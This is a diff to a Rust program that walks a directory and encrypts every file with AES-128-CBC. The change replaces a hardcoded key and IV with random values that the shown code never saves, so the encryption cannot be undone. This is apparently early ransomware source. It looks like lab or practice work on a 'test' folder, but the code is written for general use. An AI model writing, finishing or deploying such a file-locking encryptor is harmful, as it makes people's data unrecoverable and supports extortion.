@@ -3,6 +3,7 @@ use openssl::symm::{Cipher, Crypter, Mode};
 use std::fs;
 use std::fs::File;
 use std::io::{Read, Write};
+use rand::Rng;
 
 fn lsfiles(dir: &str) -> Vec<String> { 
     let mut files = Vec::new();
@@ -23,8 +24,8 @@ fn main() -> Result<(), Box<dyn Error>> {
     let root_dir = "/home/ninja12-sec/aa-main/test";
     let files = lsfiles(root_dir);
     //
-    let key = b"0123456789101112"; 
-    let iv = b"initializationvec"; 
+    let key: [u8; 16] = rand::thread_rng().gen();
+    let iv: [u8; 16] = rand::thread_rng().gen();
     let aes128 = Cipher::aes_128_cbc();
     //
     for path in &files {
@@ -33,7 +34,7 @@ fn main() -> Result<(), Box<dyn Error>> {
         files2encrypt.read_to_end(&mut data)?;
         // 
         let mut e_data = vec![0; data.len() + aes128.block_size()];
-        let mut crypter = Crypter::new(aes128, Mode::Encrypt, key, Some(iv))?;
+        let mut crypter = Crypter::new(aes128, Mode::Encrypt, &key, Some(&iv))?;
         let e_len = crypter.update(&data, &mut e_data)?;
         let final_len = crypter.finalize(&mut e_data[e_len..])?;
         let total_len = e_len + final_len;
